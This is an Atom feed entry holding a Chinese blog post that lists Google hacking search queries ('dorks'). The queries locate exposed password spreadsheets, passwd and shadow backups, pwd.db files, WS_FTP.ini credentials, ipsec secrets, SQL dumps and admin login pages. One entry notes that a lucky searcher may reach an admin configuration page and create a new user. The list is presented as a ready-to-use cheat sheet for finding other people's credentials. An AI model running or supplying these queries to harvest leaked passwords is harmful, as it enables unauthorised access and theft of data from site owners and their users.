    <id>https://hexchristmas.github.io/2019/07/21/GoogleHack常用语法/</id>
    <published>2019-07-21T15:14:30.000Z</published>
    <updated>2020-04-09T11:10:57.493Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">“Login: ” “password =” filetype: xls ( 搜索存储在excel文件中含有password的数据)。</span><br><span class="line">allinurl: auth_user_file.txt (搜索包含在服务器上的 auth_user_file.txt 的文件）。</span><br><span class="line">filetype: xls inurl: “password.xls” (查找 用户名和密码以excel格式）这个命令可以变为“admin.xls”.</span><br><span class="line">intitle: login password (获取登陆页面的连接，登陆关键词在标题中。)</span><br><span class="line">intitle: “Index of” master.passwd (密码页面索引)</span><br><span class="line">index of / backup ( 搜索服务器上的备份文件）</span><br><span class="line">intitle: index.of people.lst (包含people.list的网页）</span><br><span class="line">intitle: index.of passwd.bak ( 密码备份文件)</span><br><span class="line">intitle: “Index of” pwd.db (搜索数据库密码文件).</span><br><span class="line">intitle: “Index of .. etc” passwd (安装密码建立页面索引）.</span><br><span class="line">index.of passlist.txt (以纯文本的形式加载包含passlist.txt的页面).</span><br><span class="line">index.of.secret (显示包含机密的文档，.gov类型的网站除外) 还可以使用: index.of.private</span><br><span class="line">filetype: xls username password email (查找表格中含有username和password的列的xls文件).</span><br><span class="line">”# PhpMyAdmin MySQL-Dump” filetype: txt (列出包含敏感数据的基于php的页面)</span><br><span class="line">inurl: ipsec.secrets-history-bugs (包含只有超级用户才有的敏感数据). 还有一种旧的用法 inurl: ipsec.secrets “holds shared secrets”</span><br><span class="line">inurl: ipsec.conf-intitle: manpage</span><br><span class="line">inurl: “wvdial.conf” intext: “password” (显示包含电话号码，用户名和密码的连接。）</span><br><span class="line">inurl: “user.xls” intext: “password” (显示用户名和密码存储在xls的链接。)</span><br><span class="line">filetype: ldb admin (web服务器查找存储在数据库中没有呗googledork删去的密码。）</span><br><span class="line">inurl: search / admin.php (查找admin登陆的php页面). 如果幸运的话，还可以找到一个管理员配置界面创建一个新用户。</span><br><span class="line">inurl: password.log filetype:log (查找特定链接的日志文件。)</span><br><span class="line">filetype: reg HKEY_CURRENT_USER username (在HCU (Hkey_Current_User)路径中查找注册表文件(registyry)。)</span><br><span class="line">“Http://username: password @ www …” filetype: bak inurl: “htaccess | passwd | shadow | ht users”(查找备份文件中的用户名和密码。)</span><br><span class="line">filetype:ini ws_ftp pwd (通过ws_ftp.ini 文件查找admin用户的密码)</span><br><span class="line">intitle: “Index of” pwd.db (查找加密的用户名和密码）</span><br><span class="line">inurl:admin inurl:backup intitle:index.of (查找关键词包含admin和backup的目录。)</span><br><span class="line">“Index of/” “Parent Directory” “WS _ FTP.ini” filetype:ini WS _ FTP PWD (WS_FTP 配置文件， 可以获取FTP服务器的进入权限)</span><br><span class="line">ext:pwd inurl:(service|authors|administrators|users) “# -FrontPage-”</span><br><span class="line">filetype: sql ( “passwd values *” |” password values *” | “pass values **“) 查找存储在数据库中的sql代码和密码。 )</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      google语法
    
    </summary>
    
    
      <category term="google hack usage" scheme="https://hexchristmas.github.io/tags/google-hack-usage/"/>
    
  </entry>
  
</feed>
